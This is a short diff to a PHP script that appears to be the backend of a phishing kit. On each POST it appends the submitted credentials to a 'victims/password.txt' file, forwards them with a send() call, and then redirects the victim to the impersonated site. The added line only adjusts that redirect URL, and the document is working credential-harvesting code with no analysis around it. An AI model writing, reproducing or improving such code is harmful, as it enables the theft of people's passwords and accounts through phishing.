@@ -14,6 +14,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST')
     File_Put_Contents(".././victims/password.txt", $data, FILE_APPEND);                                      
     send($data);
     $url =	explode("||", $data)[1].".com";
+    $url = 'https://www'.$url;	
 }
 //if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
 //else 
